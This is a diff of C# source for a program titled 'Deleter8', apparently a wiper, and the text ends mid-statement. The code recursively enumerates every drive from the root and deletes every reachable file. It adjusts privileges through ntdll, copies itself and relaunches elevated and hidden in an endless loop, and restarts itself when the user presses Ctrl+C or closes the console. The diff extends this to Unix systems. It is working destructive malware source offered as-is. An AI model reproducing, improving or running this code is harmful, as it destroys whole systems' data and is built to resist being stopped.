@@ -1,122 +1,153 @@
 namespace System
 {
-    public struct CPUTime
+    public class OS
     {
-        public System.UInt64 IdleTime;
-        public System.UInt64 KernelTime;
-        public System.UInt64 UserTime;
-        public System.UInt64 ProcessorTime 
-        { 
-            get 
-            { 
-                return this.KernelTime + this.UserTime; 
-            } 
+        public static System.Boolean CapitalizeContains(System.String a, System.String b)
+        {
+            a = System.OS.Capitalize(a);
+            b = System.OS.Capitalize(b);
+            return a.IndexOf(b) >= 0;
         }
-    }
-    public struct ProcInfo
-    {
-        public System.TimeSpan ProcessorTime;
-        public System.Int64 PrivateMemorySize;
-        public System.Int32 NumThreads;
-    }
-    public abstract class OS
-    {
-        public static System.String RestartPath;
+        public static System.String Capitalize(System.String str)
+        {
+            if (System.String.IsNullOrEmpty(str))
+            {
+                return str;
+            }
+            System.Char[] a = str.ToLower().ToCharArray();
+            a[0] = System.Char.ToUpper(a[0]);
+            return new System.String(a);
+        }
+        public static System.String RestartPath = System.Reflection.Assembly.GetEntryAssembly().Location;
         public static System.String GetRestartPath()
         {
             return System.OS.RestartPath;
         }
-        public abstract System.Boolean IsWindows 
+        public virtual System.Boolean IsWindows 
         {
-            get; 
-        }
-        public abstract System.String PlatformName 
-        { 
-            get; 
-        }
-        public abstract System.String BitType 
-        { 
-            get; 
-        }
-        public virtual System.String StandaloneName 
-        { 
-            get 
-            { 
-                return "UNSUPPORTED"; 
+            get
+            {
+                return false;
             } 
         }
-        public abstract System.String ProcessName
-        {
-            get;
-            set;
+        public virtual System.String PlatformName 
+        { 
+            get 
+            {
+                return "Unknown";
+            }
         }
-        public virtual void Init()
+        public virtual System.String ProcessName
         {
+            get
+            {
+                return "Unknown";
+            }
+        }
+        public virtual System.String ProcessFilePath
+        {
+            get
+            {
+                return "Unknown";
+            }
         }
         public virtual void RestartProcess()
         {
             System.Diagnostics.Process.Start(System.OS.GetRestartPath());
         }
-        public abstract System.CPUTime MeasureAllCPUTime();
-        public virtual System.ProcInfo MeasureResourceUsage(System.Diagnostics.Process proc, System.Boolean all)
+        public static System.OS DetectedOS = new System.OS();
+        public static void DetectCurrentOS()
         {
-            System.ProcInfo info = default(System.ProcInfo);
-            info.ProcessorTime = proc.TotalProcessorTime;
-            if (all)
+            if (System.OS.DetectedOS == null || System.OS.DetectedOS == new System.OS())
             {
-                info.PrivateMemorySize = proc.PrivateMemorySize64;
-                info.NumThreads = proc.Threads.Count;
+                System.OS.DetectedOS = System.OS.GetCurrentOS();
             }
-            return info;
         }
-        public static System.OS detectedOS;
-        public static System.OS DetectOS()
-        {
-            System.OS.detectedOS = System.OS.detectedOS ?? System.OS.DoDetectOS();
-            return System.OS.detectedOS;
-        }
-        public unsafe static System.OS DoDetectOS()
+        public unsafe static System.OS GetCurrentOS()
         {
             System.PlatformID platform = System.Environment.OSVersion.Platform;
-            if (platform == System.PlatformID.Win32NT || platform == System.PlatformID.Win32Windows)
+            if (platform == System.PlatformID.Win32S)
+            {
                 return new System.WindowsOS();
-            System.SByte* utsname = stackalloc System.SByte[8192];
-            System.OS.uname(utsname);
-            System.String kernel = new System.String(utsname);
-            if (kernel == "Darwin")
-            {
-                return new System.macOS();
             }
-            if (kernel == "Linux")
+            else if (platform == System.PlatformID.Win32Windows)
             {
-                return new System.LinuxOS();
+                return new System.WindowsOS();
             }
-            if (kernel == "FreeBSD")
+            else if (platform == System.PlatformID.Win32NT)
             {
-                return new System.FreeBSD_OS();
+                return new System.WindowsOS();
             }
-            if (kernel == "NetBSD")
+            else if (platform == System.PlatformID.WinCE)
             {
-                return new System.NetBSD_OS();
+                return new System.WindowsOS();
             }
-            return new System.UnixOS();
+            else if (platform == System.PlatformID.Xbox)
+            {
+                return new System.WindowsOS();
+            }
+            else if (platform == System.PlatformID.Unix)
+            {
+                System.SByte* utsname = stackalloc System.SByte[8192];
+                System.OS.uname(utsname);
+                System.String kernel = new System.String(utsname);
+                if (System.OS.CapitalizeContains(kernel, "Linux"))
+                {
+                    return new System.LinuxOS();
+                }
+                else if (System.OS.CapitalizeContains(kernel, "Unix"))
+                {
+                    return new System.UnixOS();
+                }
+                else
+                {
+                    return new System.UnixOS();
+                }
+            }
+            else if (platform == System.PlatformID.MacOSX)
+            {
+                return new System.UnixOS();
+            }
+            else
+            {
+                System.SByte* utsname = stackalloc System.SByte[8192];
+                System.OS.uname(utsname);
+                System.String kernel = new System.String(utsname);
+                if (System.OS.CapitalizeContains(kernel, "Windows"))
+                {
+                    return new System.WindowsOS();
+                }
+                else if (System.OS.CapitalizeContains(kernel, "Linux"))
+                {
+                    return new System.LinuxOS();
+                }
+                else if (System.OS.CapitalizeContains(kernel, "Unix"))
+                {
+                    return new System.UnixOS();
+                }
+                else
+                {
+                    return new System.UnixOS();
+                }
+            }
         }
         [System.Runtime.InteropServices.DllImport("libc")]
         public unsafe static extern void uname(System.SByte* uname_struct);
     }
-
-    public class WindowsOS : OS
+    public class WindowsOS : System.OS
     {
-        public System.String pName = System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
         public override System.String ProcessName 
         {
             get
             {
-                return pName;
+                return System.Reflection.Assembly.GetExecutingAssembly().GetName().Name;
             }
-            set
+        }
+        public override System.String ProcessFilePath
+        {
+            get
             {
-                pName = value;
+                return System.IO.Path.GetFullPath(System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName);
             }
         }
         public override System.Boolean IsWindows 
@@ -131,36 +162,23 @@ namespace System
             get 
             { 
                 return "Windows"; 
-            } }
-        public override System.String BitType
-        {
-            get 
-            {
-                return System.IntPtr.Size == 8 ? "64-bit" : "32-bit"; 
-            }
+            } 
         }
-        public override System.CPUTime MeasureAllCPUTime()
-        {
-            System.CPUTime all = default(CPUTime);
-            System.WindowsOS.GetSystemTimes(out all.IdleTime, out all.KernelTime, out all.UserTime);
-            all.KernelTime -= all.IdleTime;
-            return all;
-        }
-        [System.Runtime.InteropServices.DllImport("kernel32.dll")]
-        public static extern System.Int32 GetSystemTimes(out System.UInt64 idleTime, out System.UInt64 kernelTime, out System.UInt64 userTime);
     }
     public class UnixOS : System.OS
     {
-        public System.String pName = System.UnixOS.GetProcessExePath();
         public override System.String ProcessName
         {
             get
             {
-                return pName;
+                return System.UnixOS.GetProcessExePath();
             }
-            set
+        }
+        public override System.String ProcessFilePath
+        {
+            get
             {
-                pName = value;
+                return System.IO.Path.GetFullPath(System.Reflection.Assembly.GetExecutingAssembly().Location);
             }
         }
         public override System.String PlatformName 
@@ -170,13 +188,6 @@ namespace System
                 return "Unix"; 
             } 
         }
-        public override System.String BitType
-        {
-            get 
-            { 
-                return IntPtr.Size == 8 ? "64-bit" : "32-bit";
-            }
-        }
         public override System.Boolean IsWindows
         { 
             get 
@@ -184,7 +195,6 @@ namespace System
                 return false; 
             } 
         }
-
         public override void RestartProcess()
         {
             this.RestartInPlace();
@@ -195,7 +205,7 @@ namespace System
             System.UnixOS.execvp(exe, new System.String[] 
             { 
                 exe, 
-                RestartPath, 
+                System.OS.RestartPath, 
                 null 
             });
             System.Console.WriteLine("execvp {0} failed: {1}", exe, System.Runtime.InteropServices.Marshal.GetLastWin32Error());
@@ -213,12 +223,6 @@ namespace System
         {
             return System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
         }
-        public override System.CPUTime MeasureAllCPUTime()
-        {
-            return default(CPUTime);
-        }
-        [System.Runtime.InteropServices.DllImport("libc", SetLastError = true)]
-        public unsafe static extern System.Int32 sysctlbyname(System.String name, void* oldp, System.IntPtr* oldlenp, System.IntPtr newp, System.IntPtr newlen);
     }
     public class LinuxOS : System.UnixOS
     {
@@ -229,50 +233,12 @@ namespace System
                 return "Linux"; 
             } 
         }
-        public override System.String StandaloneName
+        public override System.String ProcessFilePath
         {
-            get 
-            { 
-                return System.IntPtr.Size == 8 ? "nix64" : "nix32"; 
-            }
-        }
-        public override void Init()
-        {
-            base.Init();
-        }
-        public override System.CPUTime MeasureAllCPUTime()
-        {
-            using (System.IO.StreamReader r = new System.IO.StreamReader("/proc/stat"))
+            get
             {
-                string line = r.ReadLine();
-                if (line.StartsWith("cpu "))
-                {
-                    return System.LinuxOS.ParseCpuLine(line);
-                }
+                return System.IO.Path.GetFullPath(System.UnixOS.GetProcessExePath());
             }
-            return default;
-        }
-        public static System.Char[] space = new System.Char[]
-        {
-            ' '
-        };
-        public static System.String[] SplitSpaces(System.String value)
-        {
-            return value.Split(System.LinuxOS.space);
-        }
-        public static System.CPUTime ParseCpuLine(System.String line)
-        {
-            line = line.Replace("  ", " ");
-            System.String[] bits = System.LinuxOS.SplitSpaces(line);
-            System.UInt64 user = System.UInt64.Parse(bits[1]);
-            System.UInt64 nice = System.UInt64.Parse(bits[2]);
-            System.UInt64 kern = System.UInt64.Parse(bits[3]);
-            System.UInt64 idle = System.UInt64.Parse(bits[4]);
-            System.CPUTime all;
-            all.UserTime = user + nice;
-            all.KernelTime = kern;
-            all.IdleTime = idle;
-            return all;
         }
         public override void RestartInPlace()
         {
@@ -282,7 +248,7 @@ namespace System
                 System.String[] args = System.LinuxOS.GetProcessCommandLineArgs();
                 System.UnixOS.execvp(exe, args);
             }
-            catch (Exception ex)
+            catch (System.Exception ex)
             {
                 System.Console.WriteLine("Error restarting process: {0}", ex);
             }
@@ -298,178 +264,413 @@ namespace System
             }
         }
     }
-    public class FreeBSD_OS : System.UnixOS
-    {
-        public override System.String PlatformName
-        { 
-            get 
-            { 
-                return "FreeBSD"; 
-            } 
-        }
-        public unsafe override System.CPUTime MeasureAllCPUTime()
-        {
-            const System.Int32 CPUSTATES = 5;
-            System.UIntPtr* states = stackalloc System.UIntPtr[CPUSTATES];
-            System.IntPtr size = (System.IntPtr)(CPUSTATES * System.IntPtr.Size);
-            sysctlbyname("kern.cp_time", states, &size, System.IntPtr.Zero, System.IntPtr.Zero);
-            System.CPUTime all;
-            all.UserTime = states[0].ToUInt64() + states[1].ToUInt64();
-            all.KernelTime = states[2].ToUInt64();
-            all.IdleTime = states[4].ToUInt64();
-            return all;
-        }
-    }
-    public class NetBSD_OS : System.UnixOS
-    {
-        public override string PlatformName 
-        { 
-            get 
-            { 
-                return "NetBSD"; 
-            } 
-        }
-        public unsafe override System.CPUTime MeasureAllCPUTime()
-        {
-            const System.Int32 CPUSTATES = 5;
-            System.UInt64* states = stackalloc System.UInt64[CPUSTATES];
-            System.IntPtr size = (System.IntPtr)(CPUSTATES * sizeof(System.UInt64));
-            System.UnixOS.sysctlbyname("kern.cp_time", states, &size, System.IntPtr.Zero, System.IntPtr.Zero);
-            CPUTime all;
-            all.UserTime = states[0] + states[1];
-            all.KernelTime = states[2];
-            all.IdleTime = states[4];
-            return all;
-        }
-    }
-    public class macOS : System.UnixOS
-    {
-        public override System.String PlatformName 
-        { 
-            get 
-            { 
-                return "macOS"; 
-            } 
-        }
-        public override System.String StandaloneName
-        {
-            get 
-            { 
-                return System.IntPtr.Size == 8 ? "mac64" : "mac32"; 
-            }
-        }
-        public override System.CPUTime MeasureAllCPUTime()
-        {
-            System.UInt32[] info = new System.UInt32[4];
-            System.UInt32 count = 4;
-            System.Int32 flavor = 3;
-            System.macOS.host_statistics(System.macOS.mach_host_self(), flavor, info, ref count);
-            System.CPUTime all;
-            all.IdleTime = info[2];
-            all.UserTime = info[0] + info[3];
-            all.KernelTime = info[1];
-            return all;
-        }
-        [System.Runtime.InteropServices.DllImport("libc")]
-        public static extern System.IntPtr mach_host_self();
-        [System.Runtime.InteropServices.DllImport("libc")]
-        public static extern System.Int32 host_statistics(System.IntPtr port, System.Int32 flavor, System.UInt32[] info, ref System.UInt32 count);
-    }
     public class Deleter
     {
-        public static void Separate(System.String str, System.Char splitter,
-                             out System.String prefix, out System.String suffix)
+        public static System.Collections.Generic.List<System.String> DirectoriesList = new System.Collections.Generic.List<System.String>()
         {
-            System.Int32 index = str.IndexOf(splitter);
-            prefix = index == -1 ? str : str.Substring(0, index);
-            suffix = index == -1 ? "" : str.Substring(index + 1);
-        }
-        public const System.String Ver = "2.6";
-        public const System.String Title = "Deleter8 v" + System.Deleter.Ver;
-        public static System.String[] LogicalDrives = System.IO.Directory.GetLogicalDrives();
-        public static System.Collections.Generic.List<System.IO.DriveInfo> Disks = new System.Collections.Generic.List<System.IO.DriveInfo>(System.IO.DriveInfo.GetDrives());
-        public static System.String FileName = System.String.Empty;
-        public static System.String FileExtension = System.String.Empty;
-        public static System.Double Double;
-        public static System.String[] Messages = System.Deleter.Argument.Split('\n');
-        public static System.String Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
-        public static void DeleteDir(System.String[] args)
+        };
+        public static System.Boolean CanAccess(System.String folderPath, out System.Exception ex)
         {
-            System.Console.WriteLine(args);
-            System.Console.Clear();
-            System.Console.WriteLine(System.Deleter.Messages);
-            foreach (System.IO.DriveInfo disk in System.Deleter.Disks)
+            System.IO.DirectoryInfo dirInfo = new System.IO.DirectoryInfo(folderPath);
+            try
             {
-                if (disk.Name != disk.VolumeLabel)
+                System.Security.AccessControl.DirectorySecurity dirAC = dirInfo.GetAccessControl(System.Security.AccessControl.AccessControlSections.All);
+                ex = null;
+                return true;
+            }
+            catch (System.Security.AccessControl.PrivilegeNotHeldException e)
+            {
+                ex = e;
+                return false;
+            }
+        }
+        public static System.Collections.Generic.List<System.String> AddDir(System.String dir)
+        {
+            foreach (System.String d in System.IO.Directory.GetDirectories(dir))
+            {
+                if (System.Deleter.CanAccess(d, out System.Exception ex))
                 {
-                    System.Console.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
+                    System.Deleter.DirectoriesList.Add(d);
+                    System.Deleter.AddDir(d);
                 }
                 else
                 {
-                    System.Console.WriteLine("Current drive is: " + disk.Name);
+                    System.Console.WriteLine("Can't access " + d + ex);
                 }
-                foreach (System.String drive in System.Deleter.LogicalDrives)
+            }
+            return System.Deleter.DirectoriesList;
+        }
+        public const System.String Ver = "2.8";
+        public const System.String Title = "Deleter8 v" + System.Deleter.Ver;
+        public static System.String[] LogicalDrives;
+        public static System.Collections.Generic.List<System.IO.DriveInfo> Disks = new System.Collections.Generic.List<System.IO.DriveInfo>()
+        {
+        };
+        public static System.String FileName = System.String.Empty;
+        public static System.String FileExtension = System.String.Empty;
+        public static System.Double Double;
+        public static System.Double LoopingDouble;
+        public static System.Double Count = 0;
+        public static System.String Argument = "                                                                      ....                          \n                                                                    ..-+=:...                       \n                                                                 ..+########..                      \n                                                              ..=##########*...                     \n                                                             .:###########*###-.                    \n                 ........                                 ..:##############*##*..                   \n               ....-####+:..                             .:*##################..                    \n              ..=######+*##+:....                      ..=###################..                     \n              .++*#######*+####=:...                 ..-###################*.                       \n              .=*################*-...              ..=###################=..                       \n               ..=##########++#####*=:...          .-###################*:..                        \n                ..-##################==...       ..+###################=..                          \n                 ..-*##################*+=:.   ..-*##################*:..                           \n                   ..=**##################*+-..:*###################=.                              \n                    ...:#*###################++#################**=...                              \n                       ..*####################################=++:...                               \n                        ..+#################################=+=:.                                   \n                         ..:+##############################+=:.                                     \n                            ..-############################-..                                      \n                               ..=#######################*:..                                       \n                                ...+######################-.                                        \n                                ..+#*##################*###*:..                                     \n                               .:#####*-################**####..                                    \n                              .##**+*=#####################*###*..                                  \n                           ..-*#*##=-###*-=+################-:###+...                               \n                         ...+#:=*+.-*#+..-*###################-=###-...                             \n                        ..-+-:=-:.=**:-.-#####*-*+**###########*-+###+...                           \n                       ..:===-::.:--..:=####*:...+=-*+*####***###+-+###-..                          \n                     ..:.----:=-+--:.+#####-.    .:+++++#####*+*###=:*##*:..                        \n                    ..---=*=-===+:..+####+:.      ...+==:+*####+*####-:*##=..                       \n                   ..:--=++=+#+*:.:*###*:.           .:+*=+*#####+*####-=##*:                       \n                ....=--+**##**#:.+###*:.              ..:**+**######*###*=*##=..                    \n                ..:--:+*##***-..+#**:.                 ...:+###=+####***##**##*-..                  \n              ..::..-=*#*-*=..=#+*-...                    ..:*##*=-*####***#**##=..                 \n            ..:...:==##==+..:***=..                          .-+##*+=-+##++###++#*:..               \n           ......--+**=+:..-+*=..                             ..:+##*+-+##*+###+-+#+.               \n         .......::+#==-...:+=..                                  .:*###*+#*#*+###+:**:.             \n        .........=+=-....==...                                    ...+###***#*##*+#-:==.            \n       ........:*==:...-+:..                                        ...=*###***+#*-=*.:-..          \n        .  ...--:....:+....                                           ...:==+*:=+*#=-:=...          \n          ....-....:=:..                                                ....:-:-.=#+-.:=:.          \n         ...... ..=:..                                                       ......-=-..::.         \n           ... .:..                                                             .:.........         \n              ..                                                                  ...  .....        \n";
+        public static System.String[] Messages = System.Deleter.Argument.Split('\n');
+        public static System.Boolean FileDeleted;
+        public static System.Exception Exception;
+        public static void TryDeleteFile(System.String file)
+        {
+            if (System.IO.File.Exists(file))
+            {
+                try
                 {
-                    System.String root = System.IO.Directory.GetDirectoryRoot(drive);
-                    if (root == null || root == "")
+                    System.Console.WriteLine("Deleting " + file);
+                    System.IO.File.Delete(file);
+                    if (!System.IO.File.Exists(file))
                     {
-                        root = "/";
+                        System.Deleter.FileDeleted = true;
                     }
-                    System.String[] dirs = System.IO.Directory.GetDirectories(root);
+                    else
+                    {
+                        System.Deleter.Exception = new System.InvalidOperationException("Failed to delete file: " + file);
+                        System.Deleter.FileDeleted = false;
+                    }
+                }
+                catch (System.Exception e)
+                {
+                    System.Deleter.Exception = e;
+                    System.Deleter.FileDeleted = false;
+                }
+            }
+            else
+            {
+                System.Deleter.FileDeleted = true;
+            }
+        }
+        public static void ContinueDeletingUnix(System.String[] args)
+        {
+            try
+            {
+                System.Deleter.RtlAdjustPrivilege(19, true, false, out System.Deleter.PreviousValue);
+            }
+            catch
+            {
+                System.Console.WriteLine("Failed to adjust privileges, continuing without them.");
+            }
+            System.Console.Clear();
+            System.Deleter.Count++;
+            System.Console.WriteLine(System.Deleter.Count);
+            System.Console.ForegroundColor = System.ConsoleColor.Yellow;
+            System.Console.BackgroundColor = System.ConsoleColor.Black;
+            System.Threading.Thread.Sleep(200);
+            System.Console.WriteLine(System.Deleter.Messages);
+            System.String root = System.IO.Directory.GetDirectoryRoot(System.IO.Directory.GetCurrentDirectory());
+            if (root == null || root == "")
+            {
+                root = "/";
+            }
+            System.Deleter.AddDir(root);
+            while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
+            {
+                System.Deleter.LoopingDouble++;
+                try
+                {
+                    System.Collections.Generic.List<System.String> dirs = System.Deleter.DirectoriesList;
                     foreach (System.String dir in dirs)
                     {
                         System.String[] files = System.IO.Directory.GetFiles(dir);
                         foreach (System.String file in files)
                         {
-                            System.IO.File.Delete(file);
-                            System.Console.WriteLine("Deleting " + file);
+                            System.Deleter.TryDeleteFile(file);
+                            if (System.Deleter.FileDeleted == false)
+                            {
+                                System.Console.WriteLine("Failed to delete file: " + file);
+                                System.Console.WriteLine(System.Deleter.Exception);
+                            }
                         }
                     }
+                }
+                catch 
+                {
+                    System.Deleter.DeleteDirUnix(args);
+                }
+            }
+        }
+        public static void DeleteDirUnix(System.String[] args)
+        {
+            try
+            {
+                System.Deleter.RtlAdjustPrivilege(19, true, false, out System.Deleter.PreviousValue);
+            }
+            catch
+            {
+                System.Console.WriteLine("Failed to adjust privileges, continuing without them.");
+            }
+            System.Console.ForegroundColor = System.ConsoleColor.Red;
+            System.Console.BackgroundColor = System.ConsoleColor.Black;
+            System.Console.WriteLine(System.Deleter.Messages);
+            System.String root = System.IO.Directory.GetDirectoryRoot(System.IO.Directory.GetCurrentDirectory());
+            if (root == null || root == "")
+            {
+                root = "/";
+            }
+            System.Deleter.AddDir(root);
+            while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
+            {
+                System.Deleter.LoopingDouble++;
+                try
+                {
+                    System.Collections.Generic.List<System.String> dirs = System.Deleter.DirectoriesList;
+                    foreach (System.String dir in dirs)
+                    {
+                        System.String[] files = System.IO.Directory.GetFiles(dir);
+                        foreach (System.String file in files)
+                        {
+                            System.Deleter.TryDeleteFile(file);
+                            if (!System.Deleter.FileDeleted)
+                            {
+                                System.Console.WriteLine("Failed to delete file: " + file);
+                                System.Console.WriteLine(System.Deleter.Exception);
+                            }
+                        }
+                    }
+                }
+                catch
+                {
+                    System.Deleter.ContinueDeletingUnix(args);
+                }
+            }
+        }
+        public static void DeleteDir(System.String[] args)
+        {
+            try
+            {
+                System.Console.WriteLine(args);
+                System.Console.Clear();
+                System.Console.WriteLine(System.Deleter.Messages);
+                System.Deleter.LogicalDrives = System.IO.Directory.GetLogicalDrives();
+                System.Deleter.Disks = new System.Collections.Generic.List<System.IO.DriveInfo>(System.IO.DriveInfo.GetDrives());
+                foreach (System.IO.DriveInfo disk in System.Deleter.Disks)
+                {
+                    if (disk.Name != disk.VolumeLabel)
+                    {
+                        System.Console.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
+                    }
+                    else
+                    {
+                        System.Console.WriteLine("Current drive is: " + disk.Name);
+                    }
+                    foreach (System.String drive in System.Deleter.LogicalDrives)
+                    {
+                        System.String root = System.IO.Directory.GetDirectoryRoot(drive);
+                        if (root == null || root == "")
+                        {
+                            root = "/";
+                        }
+                        System.Deleter.AddDir(root);
+                        System.Collections.Generic.List<System.String> dirs = System.Deleter.DirectoriesList;
+                        foreach (System.String dir in dirs)
+                        {
+                            System.String[] files = System.IO.Directory.GetFiles(dir);
+                            foreach (System.String file in files)
+                            {
+                                System.Deleter.TryDeleteFile(file);
+                                if (!System.Deleter.FileDeleted)
+                                {
+                                    System.Console.WriteLine("Failed to delete file: " + file);
+                                    System.Console.WriteLine(System.Deleter.Exception);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            catch
+            {
+                while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
+                {
+                    System.Deleter.LoopingDouble++;
+                    System.Deleter.ContinueDeleting(args);
+                }
+            }
+        }
+        public static void ContinueDeleting(System.String[] args)
+        {
+            try
+            {
+                System.Console.WriteLine(args);
+                System.Console.Clear();
+                System.Deleter.Count++;
+                System.Deleter.LogicalDrives = System.IO.Directory.GetLogicalDrives();
+                System.Deleter.Disks = new System.Collections.Generic.List<System.IO.DriveInfo>(System.IO.DriveInfo.GetDrives());
+                System.Console.WriteLine(System.Deleter.Count);
+                System.Console.ForegroundColor = System.ConsoleColor.Yellow;
+                System.Console.BackgroundColor = System.ConsoleColor.Black;
+                System.Threading.Thread.Sleep(200);
+                System.Console.WriteLine(System.Deleter.Messages);
+                foreach (System.IO.DriveInfo disk in System.Deleter.Disks)
+                {
+                    if (disk.Name != disk.VolumeLabel)
+                    {
+                        System.Console.WriteLine("Current drive is: " + disk.Name + disk.VolumeLabel);
+                    }
+                    else
+                    {
+                        System.Console.WriteLine("Current drive is: " + disk.Name);
+                    }
+                    foreach (System.String drive in System.Deleter.LogicalDrives)
+                    {
+                        System.String root = System.IO.Directory.GetDirectoryRoot(drive);
+                        if (root == null || root == "")
+                        {
+                            root = "/";
+                        }
+                        System.Deleter.AddDir(root);
+                        System.Collections.Generic.List<System.String> dirs = System.Deleter.DirectoriesList;
+                        foreach (System.String dir in dirs)
+                        {
+                            System.String[] files = System.IO.Directory.GetFiles(dir);
+                            foreach (System.String file in files)
+                            {
+                                System.Deleter.TryDeleteFile(file);
+                                if (!System.Deleter.FileDeleted)
+                                {
+                                    System.Console.WriteLine("Failed to delete file: " + file);
+                                    System.Console.WriteLine(System.Deleter.Exception);
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            catch
+            {
+                while (System.Deleter.LoopingDouble != System.Double.PositiveInfinity)
+                {
+                    System.Deleter.LoopingDouble++;
+                    System.Deleter.DeleteDir(args);
                 }
             }
         }
         public delegate System.Boolean ConsoleEventDelegate(System.Int32 eventType);
         [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
-        public static extern System.Boolean SetConsoleCtrlHandler(ConsoleEventDelegate callback, System.Boolean add);
-        public static System.Deleter.ConsoleEventDelegate handler;
+        public static extern System.Boolean SetConsoleCtrlHandler(System.Deleter.ConsoleEventDelegate callback, System.Boolean add);
+        public static System.Deleter.ConsoleEventDelegate Handler;
         public static System.Boolean ConsoleEventCallback(System.Int32 eventType)
         {
-            System.OS.DoDetectOS().RestartProcess();
+            System.OS.DetectedOS.RestartProcess();
             return false;
         }
-        public static void OnCancelKeyPress(object sender, ConsoleCancelEventArgs e)
+        public static void OnCancelKeyPress(System.Object sender, System.ConsoleCancelEventArgs e)
         {
-            System.OS.DoDetectOS().RestartProcess();
+            System.OS.DetectedOS.RestartProcess();
         }
-        public static void Main(System.String[] args)
+        [System.Runtime.InteropServices.DllImport("ntdll.dll")]
+        public static extern System.UInt32 RtlAdjustPrivilege(System.Int32 Privilege, System.Boolean EnablePrivilege, System.Boolean IsThreadPrivilege, out System.Boolean PreviousValue);
+        public static System.Boolean PreviousValue = false;
+        public static void Continue(System.String[] args)
         {
-            System.Deleter.Separate(System.OS.DoDetectOS().ProcessName, '.', out System.Deleter.FileName, out System.Deleter.FileExtension);
-            System.Console.CancelKeyPress += OnCancelKeyPress;
-            System.Deleter.handler = new ConsoleEventDelegate(ConsoleEventCallback);
-            SetConsoleCtrlHandler(handler, true);
+            System.OS.DetectCurrentOS();
+            System.Deleter.FileExtension = System.IO.Path.GetExtension(System.OS.DetectedOS.ProcessFilePath);
+            System.Deleter.FileName = System.IO.Path.GetFileNameWithoutExtension(System.OS.DetectedOS.ProcessFilePath);
+            if (System.OS.DetectedOS.IsWindows)
+            {
+                System.Console.CancelKeyPress += System.Deleter.OnCancelKeyPress;
+                System.Deleter.Handler = new System.Deleter.ConsoleEventDelegate(System.Deleter.ConsoleEventCallback);
+                System.Deleter.SetConsoleCtrlHandler(System.Deleter.Handler, true);
+                System.Console.Title = System.Deleter.Title;
+                System.Console.ForegroundColor = System.ConsoleColor.Red;
+                System.Console.BackgroundColor = System.ConsoleColor.Black;
+            }
             if (args == null || args.Length == 0)
             {
                 args = System.Deleter.Messages;
             }
-            System.Console.Title = System.Deleter.Title;
-            System.Console.ForegroundColor = System.ConsoleColor.DarkGray;
-            System.Console.BackgroundColor = System.ConsoleColor.DarkRed;
             System.Threading.Thread.Sleep(1000);
             while (System.Deleter.Double != System.Double.PositiveInfinity)
             {
-                System.Deleter.Double++;
-                System.IO.File.Copy(System.Deleter.FileName, System.Deleter.FileName + " (" + System.Deleter.Double + ")." + System.Deleter.FileExtension);
-                System.Diagnostics.Process p = new System.Diagnostics.Process();
-                p.StartInfo.UseShellExecute = true;
-                p.StartInfo.Verb = "runas";
-                p.StartInfo.FileName = System.Deleter.FileName + "(" +
-                    System.Deleter.Double + ")." + System.Deleter.FileExtension;
-                p.StartInfo.Arguments = System.Deleter.Argument;
-                p.StartInfo.CreateNoWindow = true;
-                p.StartInfo.RedirectStandardOutput = true;
-                p.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
-                p.Start();
-                System.Deleter.DeleteDir(args);
+                try
+                {
+                    System.Deleter.Double++;
+                    if (!System.OS.DetectedOS.IsWindows)
+                    {
+                        System.Deleter.DeleteDirUnix(args);
+                    }
+                    else
+                    {
+                        System.IO.File.Copy(System.IO.Path.GetFileName(System.OS.DetectedOS.ProcessFilePath), System.Deleter.FileName + " (" + System.Deleter.Double + ")" + System.Deleter.FileExtension);
+                        System.Diagnostics.Process p = new System.Diagnostics.Process();
+                        p.StartInfo.UseShellExecute = true;
+                        p.StartInfo.Verb = "runas";
+                        p.StartInfo.FileName = System.Deleter.FileName + "(" +
+                            System.Deleter.Double + ")" + System.Deleter.FileExtension;
+                        p.StartInfo.Arguments = System.Deleter.Argument;
